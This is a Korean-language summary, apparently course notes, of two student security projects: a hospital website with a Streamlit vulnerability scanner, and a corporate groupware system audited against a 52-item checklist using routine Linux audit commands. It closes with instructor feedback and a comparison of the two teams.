#### 진단 스크립트 실행 방식

"관리자도 그렇고 취약점 진단 스크립트를 실행할 때도 이 **Bastion Host를 통해서** 밑에 웹 인스턴스를 접근을 하게 됩니다."

### 5.1.6 병원 웹사이트 주요 기능

#### 사용자 권한 체계

4조는 병원 웹사이트를 **3가지 역할**로 구분했습니다:

1. **환자 (Patient)**
2. **의사 (Doctor/의료진)**
3. **관리자 (Administrator)**

#### 1. 회원가입 및 권한 선택

"저희 웹페이지는 환자 그리고 의사 그리고 관리자 이런 세 가지의 역할이 존재합니다. 그 중에서 가입해서 받을 수 있는 권한은 **환자와 의사**입니다."

**회원가입 입력 항목**:
- 아이디 (중복 체크 가능)
- 비밀번호
- 주소
- 이메일
- 휴대폰 번호
- 약관 동의
- **가입 유형 선택**: 환자 OR 의료진

#### 2. 환자 기능

**2-1. 문진표 작성**

"진단을 받기 위해서 먼저 본인 몸 상태에 대한 **문진표**를 먼저 작성을 해야 됩니다. 문진표를 작성을 이렇게 쭉 하게 됩니다. 그래서 이 작성된 문진표는 데이터베이스에 저장이 되게 됩니다."

**2-2. 진료 예약**

"이 작성된 문진표로 바탕으로 진료 예약을 할 건데 이런 식으로 **날짜와 시간**을 정해 주시면은 진료 예약이 정해집니다."

**2-3. 상담 게시판**

"의사와 환자 간에 상담을 할 수 있는 **상담 게시판**이 있습니다."

**상담 게시판의 특징**:
- 환자가 글을 쓸 때 **담당 의사를 지정** 가능
- 해당 게시물을 열람할 수 있는 사람: **환자 본인과 선택받은 의사 2명 뿐**
- 비밀 선택 시 목록에서 안 보임
- 수정과 삭제: **글쓴이 또는 관리자만 가능**
- 의사는 답글로 상담 내역 작성 가능

#### 3. 환자 마이페이지

**3-1. 프로필 수정**
- 회원가입 시 입력한 정보 수정 가능
- 선택 약관 동의/철회 가능

**3-2. 2차 인증**

"개인정보 수정을 한 뒤에는 **현재 비밀번호를 입력**을 한 다음에 2차 인증을 해야 최종적으로 개인정보가 수정이 되게 됩니다."

**3-3. 진료 기록 조회**

"그동안에 봤던 진료 기록들을 쭉 볼 수 있고 **처방전을 PDF로 이렇게 다운로드** 받을 수가 있습니다."

**3-4. 예약 현황**

"담당의료진이 예약을 확정을 하게 되면 상태 **예약 확정**이 뜨게 됩니다. 그리고 예약 확정이 되지 않은 예약들은 환자가 **직접 취소**를 할 수가 있습니다."

#### 4. 의사 기능

**4-1. EMR 진료 시스템**

"EMR 진료 시스템 같은 경우는 진료 예약 현황을 먼저 보자면 여기서 전체 진료 예약 시스템 리스트를 확인할 수가 있고 **우클릭**을 통해서 이렇게 예약 확정하기 버튼을 통해서 예약을 확정할 수가 있습니다."

**4-2. EMR 창**

"EMR 같은 경우에는 **새창**으로 진짜 의사분들이 사용하는 그런 프로그램 느낌을 내기 위해 새창으로 열리도록 구성을 했고..."

**EMR 화면 구성**:
- **가장 우측**: 진료 예약 리스트
- **가장 좌측**: 환자 명 리스트
- **중앙**: 환자 선택 시 환자 종합 정보 표시
- **진료 기록 작성**: 진료 내용 입력 후 "진료 완료" 버튼
- **처방전 발행**: 자동으로 처방전 PDF 생성

#### 5. 관리자 기능

**5-1. 종합 대시보드**

"관리자 같은 경우는 이 전체 환자 의료진 전체 계정에 이런 **종합적인 지표**를 보여주는 그런 페이지에 접속을 할 수 있고..."

**5-2. 보안 관제**

"접속로그 로그인 로그 이런 걸 통해서 **보안 관제**를 좀 할 수 있도록 저희가 만들어놨습니다."

**5-3. 계정 관리**

"계정을 관리할 수가 있는데 이런 식으로 계정 아예 **삭제**를 해버릴 수도 있고 그리고 어떤 계정들이 가입이 되어 있는지를 확인할 수가 있습니다."

**5-4. 상담 게시판 전체 관리**

"상담 게시판을 특별히 관리자는 **다 열어볼 수가 있고**요. 그래서 이 상담 게시판을 종합적으로 관리를 할 수가 있습니다."

**5-5. 진료 기록 관리**

"진료 기록 또한 이렇게 관리가 가능합니다."

### 5.1.7 체크리스트: 웹/서버/미들웨어

4조는 **OWASP Top 10**과 **KISA 주요정보통신기반시설 취약점 가이드라인**을 참고하여 체크리스트를 작성했습니다.

#### 체크리스트 구성

| 분야 | 주요 점검 항목 |
|-----|---------------|
| **웹** | SQL Injection, Cross-Site Scripting, Command Injection 등 |
| **OS (서버)** | 계정 관련 설정, 권한 관련 설정 |
| **미들웨어** | 서버 정보 노출, 파일 노출, 불필요한 메소드 설정 |

"오아스프 탑 10의 내용과 그리고 키사에서 제공하는 **주요 정보 통신 기반 취약점 가이드라인**을 좀 참고해서 체크리스트를 좀 작성을 했습니다."

### 5.1.8 취약점 스캐너 (Streamlit 기반)

#### 진단 환경 설정

**입력 정보**:

1. **진단 대상 URL**
   - 병원 웹사이트 URL 입력

2. **세션 정보**
   - 환자 세션 쿠키
   - 의료진 세션 쿠키
   - "로그인을 해야 볼 수 있는 사이트들이 있기 때문에 이걸 쿠키를 입력을 받도록 만들었구요."

3. **OS와 미들웨어 접속 정보**
   - SSH 접속 정보 입력
   - Private IP 정보 (Bastion Host 경유)
   - 키 페어 업로드

"그래서 이 스캐너는 **베스천으로 접속이 된 상태**에서 스캐너를 오픈을 한 거고 그래서 여기는 **프라이빗 IP 정보**를 입력을 하면 됩니다."

#### 크롤링 및 엔드포인트 분석

"전체 보안 진단 시작 버튼을 누르면 이런 식으로 전체 웹사이트의 전체 **엔드포인트를 분석**을 하게 됩니다. 이렇게 엔드포인트와 파라미터를 스캔을 하고 그리고 필요한 경우 쿠키를 또 끼워 넣어서 로그인이 필요한 페이지도 이렇게 열 수 있도록 했습니다."

**크롤러 구현**:
- Python의 **requests 모듈**
- **BeautifulSoup** 라이브러리
- 링크 탐색 자동화

#### 취약점 점검 프로세스

"이 스캔 정보를 바탕으로 취약점 점검을 할 수가 있는데..."

**항목별 점검**:
- 웹
- OS
- 미들웨어

"체크리스트를 기반으로 점검을 하게 됩니다."

#### 진단 결과 판정

| 판정 | 의미 |
|------|------|
| **양호** | 취약점 없음 |
| **취약** | 취약점 발견 |
| **NA** | 스크립트 없음 또는 에러 발생 |

"저희가 자동화가 어렵다고 판단된 그런 항목들은 스크립트를 좀 작성을 하진 않았고 대신에 다른 자동화 가능한 부분에 좀 더 힘을 쏟기 위해서 저희가 그 부분 **과감히 패스**를 하였습니다."

#### 결과 시각화 및 다운로드

"각각의 항목들이 이렇게 스캔이 되고 그리고 OS, 미들웨어 이런 식으로 스캔을 한 다음에 스캔 결과가 이렇게 표시가 됩니다."

**통계 표시**:
- 전체 항목 중 양호 건수
- 취약 건수
- 기타 건수
- 그래프로 시각화

**리포트 다운로드**:
"최종 결과 보고서 다운로드를 통해서 여기에 나타났던 표를 **엑셀 형식으로** 그대로 받을 수가 있습니다."

### 5.1.9 프로젝트 성과 및 인사이트

#### 프로젝트를 통해 얻은 것

"저희가 얻을 수 있었던 것은 이런 프로젝트를 통해서 **자동화된 취약점 점검이 무엇인지** 좀 알게 되는 그런 시간이었고 의료 데이터를 보호하는 게 얼마나 중요한지 이것들을 보호하기 위해서 **표준 점검 프로세스를 확보하는 게** 얼마나 중요한지를 알게 되었습니다."

#### 비즈니스 로직 이해의 중요성

"보안이라는 게 그럼 기술적인 부분도 중요하지만 그것보다 더 중요한 것은 이 **사이트 로직을 이해해야 된다**. **비즈니스 로직을 이해해야 된다**. 그래야 더 보안을 잘 할 수가 있다는 것을 좀 알게 되었던 그런 시간이었고..."

#### 자동 점검과 수동 점검의 상호 보완성

"그리고 자동 점검, 수동 점검이 **상호 보완적인 관계**여야 된다를 좀 느끼게 되었습니다."

#### AI 활용에 대한 제언

"이런 스캐너를 작성을 하다 보니까 해킹이나 취약점 점검을 할 때 필요한 그런 **페이로드들**이 있을 겁니다. SQL 인젝션이라고 하면 그거에 맞는 페이로드가 있을 거고 크로스 사이트스크립트, CSRF 관련 다 페이로드가 있을 텐데 이것들을 하나하나씩 다 입력을 하면 그 페이로드 목록은 길어지고 또 그것들을 관리하기도 어려워지고 그렇기 때문에 **AI를 활용해서 이 페이로드를 AI가 학습을 하는 게 어떤가** 싶은 생각도 듭니다."

"그래서 그런 AI 모델을 잘 만들어 놓으면 AI가 알아서 이것들은 취약점이다 아니다를 판단하는 그런 더 효율적인 **오탐률이 줄어드는** 그런 스캐너를 만들 수 있지 않을까 이런 생각이 많이 들고 그래서 더 정밀한 자동화를 구현할 수 있지 않을까 이런 생각이 들었습니다."

### 5.1.10 아쉬웠던 점

팀장의 자체 평가:

"많이 좀 많이 부족하고 또 발표도 다른 조들을 되게 열심히 하셨던데 저희 조도 열심히 했지만 그것들을 잘 봐주셨으면 좋겠고 또 이것들을 통해서 나중에 최종 프로젝트에도 더 도움이 될 수 있도록 제가 잘 정리를 했으면 좋겠다는 생각이 있습니다. 그래서 되게 좋은 시간이었고 또 이런 열심히 했던 팀원들에게 너무 감사하고 또 다음번에도 같이 볼 수 있으면 또 보면 좋겠다 이런 마음이 들었습니다."

### 5.1.11 Q&A 세션 및 강사 피드백

#### 강사의 긍정적 평가

"발표 잘하고 있고요 발표 5편 PPT 내용을 잠시만요... 제가 봤을 때는 지금까지 발표한 조 중에 **PPT 구성은 발표를 위한 PPT 구성 자체는 지금 팀이 제일 좋았던 것 같아요**. 내용이나 먼저 이런 걸 떠나서 프로젝트가 어떻게 기획됐고 어떻게 참여가 됐으면 어떻게 진행이 됐고 전반적인 상황을 처음부터 끝까지 다 알 수 있었거든요."

#### 아쉬운 점: 화면 캡처 vs 실제 시연

"발표 내용은 좋았는데 일단 아쉬운 점이 있다면 중간에 좀 시연이나 이런 것들은 조금 더 실제 구현된 내용을 놓고서 이렇게 진행을 하고 리포트나 이런 것도 실제 사이트에서 직접 보여주는 게 좋지 않았을까 **너무 화면 캡처에 많이 의존**을 한 것 같거든요 그런 부분이 조금 아쉬웠던 것 같고 실제로 어떻게 돌아가는지 화면 캡처 말고 사이트가 어떻게 구현됐는지..."

"너무 화면 캡처로만 되어 있으니까 실제로 구현이 됐는지 안 됐는지도 의심스럽고 이제 이런 부분이 있거든요. 시연 영상에서는 이제 취약점 점검 같은 경우는 잠깐 비춰지기는 했는데 좀 그런 것들 실제로 좀 사이트 소개부터 좀 보셨으면 더 좋았겠다라는 생각이 들었어요."

#### 발표 스타일 피드백

"그리고 발표자가 조금 발표를 할 때 좀 조용히 발표하는 거는 차분해 보이고 좋긴 한데 너무 이제 침체되어 있으니까 **한 옥타브 정도 더 올려 가지고** 좀 발표를 조금 기운차게 했으면 좋았겠다 라는 생각이 좀 들긴 했고요."

#### 업무 분담 관련 질문

**강사**: "취약점 진단 쪽은 개발 리소스가 너무 적었던 거 아니에요? 아까 업무 분담한 내용을 쭉 보여준 걸 보면은 그 자료조사 취약점 조사한 인원 한 명 빼고는 나머지 진단에 대해서는 거의 리소스가 없었던 것 같은데 또 해놓은 내용을 보면은 나름 신경 써서 웹사이트 구축하듯이 웹 베이스로 취약점 진단 스크립트 쪽도 잘 개발을 해줬거든요."

**팀장 답변**: "그게 스크립트 작성은 **모든 팀원이 다 했어** 가지고 그 부분을 좀 빼먹은 것 같습니다."

#### 최종 평가

"네 알겠습니다. 잘 잘 해주셨고요. 발표도 잘 해주셨고 딱히 저는 궁금한 게 없는 것 같은데..."

---

## 5.2 5조 프로젝트: OKure - 사내 그룹웨어 보안 진단

### 5.2.1 프로젝트 개요

**팀**: 5조 (팀명: OKure - 오큐어)

**프로젝트명**: 사내 그룹웨어 진단

**프로젝트 주제**: 사내 그룹웨어 웹 시스템 구축 및 흑백박스 취약점 진단

**진단 방식**:
- **화이트박스 진단** (소스 코드 분석)
- **블랙박스 진단** (웹 + 인프라)

### 5.2.2 왜 사내 그룹웨어인가?

#### 사내 그룹웨어의 정의

"사내 그룹웨어라는 웹에 대해서 설명을 해드리자면 **기업 내부 업무를 처리하는 웹 시스템**입니다."

#### 보안 진단 주제로 선정한 이유

"그래서 기업에서 일상적으로 내부 업무를 중심적으로 진행하는 시스템이고 **중요 정보가 집중 저장**되어서 계정 기반으로 민감한 업무가 오가는 보안상의 웹 진단을 하기에 적합한 웹이라고 생각이 되어서 이제 저희가 사내 그룹웨어를 중심 그 프로젝트 주제로 선정하여 진행하게 되었습니다."

#### 사내 그룹웨어의 보안 중요성

| 특징 | 설명 |
|-----|------|
| **핵심 정보 집중** | 기업 내부의 핵심 정보가 집중 저장됨 |
| **계정/권한 중심** | 계정 및 권한 기반 업무 진행 |
| **업무 필수 인프라** | 기업 업무에 필수적으로 필요한 시스템 |
| **악성 코드 유입 경로** | 파일, 게시판 기능을 통한 확산 가능성 |

"기업 내부의 계정이나 권한 중심으로 프로젝트가 권한 중심으로 프로젝트들이 진행되고, 업무에서 필수적으로 필요한 인프라이면서 파일이나 이런 게시판 기능을 통해서 **여러 가지 악성 코드의 유입 등의 확산 통로**가 될 수 있기 때문에 이런 부분들을 진단하기에 좋다고 생각하여서 저희가 이 프로젝트를 주제로 진행하게 되었습니다."

### 5.2.3 프로젝트 아키텍처

#### 시스템 구조

"프로젝트 아키텍처는 다음 것 같습니다. 이제 클라이언트가 요청을 보내면 스캐너 서버가 이제 취약점을 진단하고 결과를 제공하는 구조이고..."

#### 현업 반영 노력

"이제 다 저희가 이제 그룹웨어는 스프링부트나 리액트, 도커, MySQL 등을 사용해서 **실제 현업에서 사용하는 구조를 최대한 반영**해 보려고 노력하였습니다."

### 5.2.4 기술 스택

| 분야 | 기술 |
|-----|------|
| **백엔드** | Java, Spring Boot |
| **프론트엔드** | React |
| **데이터베이스** | MySQL |
| **컨테이너화** | Docker |
| **취약점 진단** | (Python 추정, Bash 스크립트) |

### 5.2.5 그룹웨어 웹 주요 기능

5조는 시간 관계상 웹 소개를 많이 생략했으나, PPT에 다음과 같은 기능이 명시되어 있었습니다:

1. **메인 대시보드**
2. **전자결재 시스템**
3. **사내 게시판 및 소통**
4. **팀 일정 관리**
5. **익명 건의함**

"추가적으로 이제 좀 더 자세한 웹 소개는 이후 시연에서 보여드리도록 하겠습니다."

### 5.2.6 취약점 진단 항목 (총 52개 분야)

5조는 **매우 방대한 진단 항목**을 구성했습니다. 강사가 지적한 대로, PPT 페이지가 60페이지에 달했습니다.

#### 데이터베이스 (DB) 진단 - 11개 항목

##### DB-01: 계정 보안 점검

**점검 내용**:
- 불필요한 계정 존재 여부
- 기본 계정 활성화 여부
- 익명 계정 존재 여부

##### DB-02: Rate Limiting 부재

**점검 내용**:
- 과도한 권한 부여 여부
- 일반 계정의 DDL, DCL 권한 보유 여부
- 서비스 계정과 관리자 계정 분리 여부

##### DB-03: 원격 접속 설정 점검

**점검 내용**:
- 외부 IP 접속 허용 여부
- 불필요한 원격 접속 존재 여부

##### DB-04: 비밀번호 정책

**점검 내용**:
- 비밀번호 복잡도 정책 설정 여부
- 최소 길이, 특수문자 적용 여부
- 비밀번호 만료 정책 부재 여부

##### DB-05: DB 설정 보안 점검

**점검 내용**:
- 보안 관련 설정 미흡 여부
- 불필요한 기능 활성화 여부
- 보안 파라미터 설정 값, 기본값 사용 여부

##### DB-06: SQL Injection 점검

**점검 내용**:
- 동적 SQL 사용 여부
- 문자 결합 쿼리 존재 여부
- Prepared Statement 사용 여부

##### DB-07: 암호화 설정

**점검 내용**:
- 데이터와 암호화 적용 여부
- 저장 데이터 평문 관리 여부
- 암호화 알고리즘 설정 여부

##### DB-08: 파일 권한

**점검 내용**:
- DB 관련 파일들의 과도한 권한 존재 여부
- 설정 파일 외부 접근 가능 여부

##### DB-09: 감사 로그

**점검 내용**:
- 접속 쿼리 등 로그 기록 여부
- 보안 이벤트 추적 가능 여부

##### DB-10: 백업 보안

**점검 내용**:
- 백업 파일 암호화 여부
- 접근 제어 없는 백업 파일 존재 여부
- 자동 백업 정책 부재 여부

##### DB-11: DB 버전 및 패치 점검

**점검 내용**:
- 구 버전 DB 사용 여부
- 보안 패치 적용 여부

#### OS (운영체제) 진단 - 11개 항목

##### OS-01: 계정 관리 취약점 점검

**점검 내용**:
- 불필요한 계정 존재 여부
- 기본 계정 직접 로그인 허용 여부
- 장시간 미사용 계정 방치 여부

##### OS-02: 비밀번호 정책 점검

**점검 내용**:
- 비밀번호 복잡도 정책 적용 여부
- 최소 길이, 특수문자 설정 여부

##### OS-03: 권한 설정

**점검 내용**:
- 중요 파일 (특히 시스템 로그 파일) 과도한 권한 부여 여부
- 설정 파일 일반 사용자 접근 가능 여부
- 소유자, 그룹 설정 오류 여부

##### OS-04: SUID/SGID 파일 취약점

**점검 내용**:
- 불필요한 SUID/SGID 파일 존재 여부
- 권한 상승 가능성 존재 여부

##### OS-05: 서비스 및 데몬 점검

**점검 내용**:
- 사용하지 않는 서비스 실행 중인가
- 테스트/개발용 서비스가 운영 서버에 존재하는가

##### OS-06: 네트워크 보안 설정

**점검 내용**:
- 불필요한 포트 개방 여부
- 방화벽 정책 미적용 여부

##### OS-07: SSH 보안 설정

**점검 내용**:
- 루트 계정 직접 로그인 허용 여부
- 패스워드 기반 인증 사용 허용 여부
- 취약한 암호 알고리즘 허용 여부

##### OS-08: 로그 및 감사 점검

**점검 내용**:
- 로그 미수집 또는 일부만 기록 여부
- 보안 이벤트 추적 불가능 여부

##### OS-09: 크론 및 예약 작업 취약점

**점검 내용**:
- 일반 사용자 크론 등록 허용 여부
- 악성 스크립트 자동 실행 가능성

##### OS-10: 패치 및 버전 관리

##### OS-11: 환경 변수 및 민감 정보 노출

#### WAS (Web Application Server) 진단 - 10개 항목

##### WAS-01: WAS 계정 및 실행 권한 점검

##### WAS-02: 설정 파일 보안 점검

##### WAS-03: 포트 및 리스닝 상태 점검

**점검 내용**:
- 불필요한 포트 개방 여부
- 관리용 포트 외부 노출 여부

##### WAS-04: 세션 관리 취약점

**점검 내용**:
- 세션 타임아웃 미설정
- 세션 고정
- 쿠키 기반 세션 보호 미흡

##### WAS-05: 쿠키 보안 설정

**점검 내용**:
- HTTP Only, Secure Option 누락 여부
- SameSite 설정 미흡 여부

##### WAS-06: 인증/인가 연동 취약점

**점검 내용**:
- 관리자 API 보호 미흡 여부
- 내부 API 외부 접근 가능 여부

##### WAS-07: WAS-DB 간 연결 보안

**점검 내용**:
- DB 계정 하드코딩 여부
- 과도한 DB 권한 사용 여부

##### WAS-08: 파일 업로드 및 정적 리소스 처리

**점검 내용**:
- 업로드 파일 실행 가능 여부
- 정적 리소스 접근 통제 미흡 여부

##### WAS-09: 예외 처리 및 에러 페이지

**점검 내용**:
- 내부 경로, 클래스 정보 노출 여부

##### WAS-10: 로그 관리 및 HTTPS/보안 헤더 설정

**점검 내용**:
- 민감 정보 로그 출력 여부
- HTTPS 미적용 여부
- 보안 헤더 누락 여부

#### 네트워크 진단 - 10개 항목

##### NET-01: 포트 개방 상태 및 방화벽 정책 점검

**점검 내용**:
- 불필요한 포트 개방 여부
- 방화벽 적용 여부
- 관리자 IP 제한 적용 여부

##### NET-02: 불필요한 서비스 노출

##### NET-03: 암호화 통신 및 네트워크 분리

**점검 내용**:
- 내부 관리 서비스 외부 노출 여부
- 평문 통신 사용 여부
- 취약한 암호화 프로토콜 사용 여부
- 웹/WAS/DB 네트워크 분리 여부

##### NET-04: CORS API 접근 정책

**점검 내용**:
- CORS 과도하게 허용 여부
- 대량 트래픽 차단 정책 존재 여부

##### NET-05: 트래픽 제어 (DoS 등)

##### NET-06: 로그 및 네트워크 모니터링

**점검 내용**:
- 네트워크 접근 로그 미수집 여부
- 이상 트래픽 탐지 기능 여부

##### NET-07: 내부 통신 및 제로 트러스트 미적용

"내부 네트워크라고 해도 무조건 신뢰하는 것은 위험한 정책이기 때문에, 내부 네트워크도 무조건적으로 신뢰하는 것에 대한 취약점을 점검합니다."

##### NET-08: 웹 서버 버전 및 패치 점검

##### NET-09: 디렉토리 리스팅 및 설정 파일 노출

**점검 내용**:
- 구 버전 웹 서버 사용 여부
- 디렉토리 리스팅을 통한 내부 파일 구조 노출
- 설정 파일 (예: .env 파일) 접근 가능 여부

##### NET-10: HTTP 메소드 제한 미흡 / HTTPS-TLS 설정 / Security Header

**점검 내용**:
- 불필요한 HTTP 메소드 허용 여부
- HTTPS 적용 여부
- 주요 보안 헤더 누락 여부

#### 화이트박스 진단 - 10개 항목

##### WB-01: 인증/인가 누락

**점검 내용**:
- 권한 체크 누락
- 수평/수직 권한 상승 취약점

##### WB-02: 입력 검증 및 인젝션 취약점

**점검 내용**:
- SQL Injection
- Command Injection
- 입력 검증 부재

##### WB-03: CORS 및 출력 인코딩

**점검 내용**:
- CORS 정책 부재
- CSP (Content Security Policy) 정책 부재

##### WB-04: 쿠키 설정 취약점

##### WB-05: 암호화 및 비밀 정보 관리

##### WB-06: 파일 업로드 및 다운로드 취약점

##### WB-07: 역직렬화 / 파서 취약점

##### WB-08: 로깅 및 에러 처리 정보 노출

##### WB-09: 보안 헤더 및 HTTPS 설정 취약점

##### WB-10: 의존성 및 공급망 취약점

**점검 내용**:
- 취약한 라이브러리 사용 여부

### 5.2.7 수동 진단 검증 (5가지 예시)

5조는 자동 스캐너가 제대로 취약점을 탐지하는지 검증하기 위해 **수동 진단**을 수행했습니다.

#### 1. 패스워드 정책 문제

**수동 진단 결과**:
```bash
# 루트 계정 패스워드 만료 기간 확인
$ chage -l root
Password expires: never

# /etc/login.defs 확인
PASS_MAX_DAYS    99999
```

"이거는 이제 거의 약 **273년** 정도 되는 시간이기 때문에 273년 동안 같은 비밀번호를 사용한다는 것을 확인할 수 있습니다."

**스캐너 진단 결과**:
"안전하지 않은 설계에서 그 비밀번호가 안전하지 않은 설계 항목으로 분류되어서 패스워드 정책만 찾아낸 게 아니라 다른 부분에 대해서도 이제 다른 정책들이 잘못 안전하지 않다 등을 확인할 수 있었습니다."

#### 2. 로그 파일 권한 문제

**수동 진단 결과**:
```bash
# 로그 파일 권한 확인
$ ls -l /var/log/*.log
-rw-r--r-- 1 root root 12345 Jan 6 10:00 syslog.log
```

"일반 사용자도 **읽기 권한**이 있다는 것을 확인할 수 있었습니다."

"로그 파일에는 많은 정보들이 담겨 있고 보안상으로 중요한 정보이기 때문에 일반 사용자도 읽기 권한을 가진다는 것은 분명한 취약점입니다."

**스캐너 진단 결과**:
"이 부분이 **리눅스 로그 관리**를 통해서 이제 주요 로그 파일에 대한 권한이 있다는 것을 확인할 수 그 스캐너를 통해서 이제 확인할 수 있었습니다. 제대로 진단한 것을 확인했다는 거죠."

#### 3. 방화벽 및 포트 관리 점검

**수동 진단 결과**:
```bash
# 실행 중인 서비스 확인
$ systemctl list-units --type=service

# 열려 있는 포트 확인
$ netstat -tuln
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
```

"이 포트들을 확인해 봤을 때 **0.0.0.0**이라고 설정된 것을 확인할 수 있는데 이 0.0.0.0은 **모든 네트워크 인터페이스**를 뜻하고 있고 모든 사용자가 이제 내부망에서도 외부 인터넷에서도 접속할 수 있다는 뜻을 간집니다. 그리고 이제 모든 IPv4나 IPv6 주소가 접속이 가능하고 22번 포트는 전 세계에 공유되어 있다는 것을 확인할 수 있었습니다."

**스캐너 진단 결과**:
"이 부분도 이제 저희 스캐너가 제대로 점검했는지 확인하기 위해서 보았더니 **리눅스 오픈 포트 점검**이라는 항목으로 분류된 것을 확인할 수 있었습니다. 그래서 불필요한 포트가 비활성화 되어 있거나 방화벽이 제대로 적용되지 않았다는 것을 찾는 것을 확인할 수 있었습니다."

"발견된 취약점에서 위험 포트 개방은 저희가 22번인데 **21번으로 잘못 써진 것** 같습니다. 그래서 이 부분도 확인할 수 있었습니다."

#### 4. 크론 (Cron) 관리

**수동 진단 결과**:
```bash
# Cron 명령 확인
$ crontab -l
# 비활성화됨

# At 서비스 확인
$ systemctl status atd
● atd.service - Job spooling tools
   Active: active (running)
```

"크론 관리에서 명령을 통해서 확인을 해 보니 비활성화 되어 있고 At는 이제 활성화 되어 있는 것을 확인할 수 있었습니다."

**환경 변수 민감 정보 노출**:

"환경 변수들을 확인해 보니 이 부분에 대해서는 **민감한 정보들이 노출**된 것을 확인할 수 있었습니다."

**스캐너 진단 결과**:
"이 부분도 이제 그 **리눅스 8과 디렉터리 권한**이라는 명목으로 발견된 취약점이 발견된 것을 확인할 수 있습니다."

#### 5. IDOR (Insecure Direct Object Reference) - 팀 파일 접근 제어 미흡

**취약점 시나리오**:
"팀마다 분리된 자료실 게시판이나 이제 조회 업로드 등을 했을 때 이제 팀 아이디 등을 수정해서 취약점을 그 **팀 2였던 사람이 팀 3의 그 파일 등을 확인**할 수 있는 등의 팀 3에서 팀 2의 파일을 조회할 수 있는 등의 취약점이 발견되었는데요."

**스캐너 진단 결과**:
"이 부분도 이제 **접근 제어**라는 항목으로 그 인증 접근이 제대로 파일 접근 제어가 이제 제대로 되지 않았다는 것을 저희 스캐너가 제대로 검증했다는 것을 확인할 수 있었습니다."

### 5.2.8 프로젝트 성과

"그래서 저희는 이제 총 OS, 웹, WAS, DB 등의 **전 계층의 보안 가이드를 준수**하면서 진단을 진행할 수 있었고 여러 가지 데이터들을 여러 가지 시나리오를 기반으로 취약점과 설정 오류들을 식별할 수 있었으며 이제 보안 로그의 보안 로그 등을 분석하고 **시각화를 구현**할 수 있었습니다."

### 5.2.9 Q&A 및 강사 피드백

#### 시간 관리 문제

"아주 5조 같은 경우는 저희 발표 시간 **15분을 아주 가볍게 무시**하고 페이지를 **60페이지** 가까이 작성을 하셨네요. 어떻게 어떻게 해서 발표를 하려고 이렇게 작성을 했나 했더니 역시나 기대를 저버리지 않고 시간은 가볍게 무시를 했어요."

"나중에 최종 프로젝트 할 때 최종 발표할 때는 시간 굉장히 민감해요. 거기 이제 공식적으로 외부 인사들도 불러서 이렇게 하고 해서 사전에 질문까지 다 조율을 하고 질문이 정해져 있어가지고 그 시간 범위를 벗어나도 맥시멈 **3분 안에서** 다 끝내야 되거든요. 3분 이상 벗어나면 안 돼요."

#### 내용 구성 피드백

"발표 내용을 많이 채우긴 했는데 사실은 제가 봤을 때는 발표 내용 중에 **여러분들이 구축하고 구현한 내용에 조금 더 포커스**를 맞춰서 내용을 전달해줬으면 더 좋지 않았을까 라는 생각이 들어요."

"중간에 이제 각 파트별로 취약점 항목들이나 이런 것들을 쭉 나열을 했는데 사실은 그 항목들이 제가 쭉 봤더니 앞뒤가 조금 안 났고 실제 그 항목들이 다 구현된 내용들이 아닌데 **어디에서 어디까지 구현된 거고 어떤 게 구현이 안 된 건지** 이런 부분이 정확하게 구분이 안 되는 거예요."

#### 의심스러운 내용

"발표를 쭉 들었는데 중간에 이쪽 팀은 인프라 쪽도 점검을 했다고 하고 네트워크 점검까지 했다고 하는데 포트가 열렸다 닫혔다만 가지고 외부에서 접근이 가능하다, 가능하지 않다를 판단할 수는 없거든요. 그럼 **실제 외부 환경에서 접근을 시도**해 봐야 되는 거고 이런 부분이 없는데 그런 점검을 했다고 점검에 포함돼 있고..."

"심지어는 LDAP이나 NoSQL이나 우리 과정에서는 다루지 않는 범위나 **별도의 서버 구축이 필요한 부분**이나 이런 부분도 포함돼 있는데 그런 부분을 가지고 인젝션을 시도했다, 인젝션으로 취약점을 확인했다 이런 식으로 발표를 해가지고 처음에는 와 대단한데 하고 쭉 듣고 있다 보니까 나중에는 **이게 어디부터 어디까지가 실제로 한 거지** 이런 생각을 가지게 됐거든요."

#### 긍정적 평가

"그런 부분을 조금 더 분량을 늘릴 게 아니라 우리가 한 거에 조금 더 집중하고 **굉장히 구현도 잘했어요**. 구현도 잘했는데 오히려 웹사이트 서비스에 대한 소개나 이런 쪽 시연이나 이런 것도 해주면 좋았을 건데 그런 것들은 실제로 우리가 한 것들을 보여주기보다는 어떤 기술적인 내용 이런 것들을 채우느라고 페이지는 잣득 늘었는데 **실제 의심만 사는** 이런 키워드들을 많이 던져 놓은 그런 발표가 되지 않았나 생각이 들었고 그런 부분이 조금 아쉬웠던 것 같고 어쨌든 구현도 잘했고 열심히 잘 해주셨어요."

---

## 5.3 Section 5 종합 정리

### 5.3.1 4조 vs 5조 비교

| 비교 항목 | 4조 (Safety Medical Center) | 5조 (OKure) |
|----------|----------------------------|-------------|
| **주제** | 의료 데이터 보호 | 사내 그룹웨어 보안 |
| **배경** | 코로나 이후 의료 데이터 중요성 증가 | 기업 내부 업무 시스템 보안 |
| **백엔드** | Python Flask | Java Spring Boot |
| **프론트엔드** | HTML, CSS | React |
| **스캐너** | Streamlit 기반 | (명시되지 않음) |
| **진단 방식** | 블랙박스 (웹 + OS + 미들웨어) | 화이트박스 + 블랙박스 |
| **진단 항목** | (명시되지 않음, 추정 30-50개) | 52개 (DB 11 + OS 11 + WAS 10 + NET 10 + WB 10) |
| **특징** | Bastion Host를 통한 Private Subnet 접근 | 수동 진단으로 스캐너 검증 |
| **강사 평가** | PPT 구성 우수, 시연 부족 | 구현 우수, 발표 시간 초과 |

### 5.3.2 공통 테마

1. **자동화의 필요성**
   - 4조: "시간도 많이 들어갔고 인력도 많이 들어갔고"
   - 5조: 52개 진단 항목 자동화 구현

2. **비즈니스 로직 이해**
   - 4조: "비즈니스 로직을 이해해야 된다. 그래야 더 보안을 잘 할 수가 있다"
   - 5조: 그룹웨어의 파일 업로드, 전자결재 등 업무 프로세스 이해

3. **자동 + 수동 진단의 조화**
   - 4조: "자동 점검, 수동 점검이 상호 보완적인 관계여야 된다"
   - 5조: 스캐너 개발 후 수동 진단으로 검증

4. **AI 활용 가능성**
   - 4조: "AI를 활용해서 이 페이로드를 AI가 학습을 하는 게 어떤가"
   - 5조: (명시되지 않음)

### 5.3.3 강사의 공통 피드백

**긍정적 측면**:
- 두 팀 모두 구현을 잘함
- 열심히 노력한 흔적이 역력함

**아쉬운 측면**:
- **시연 부족**: 화면 캡처에 너무 의존
- **실제 구현 vs 이론**: 어디까지 실제로 구현했는지 명확하지 않음
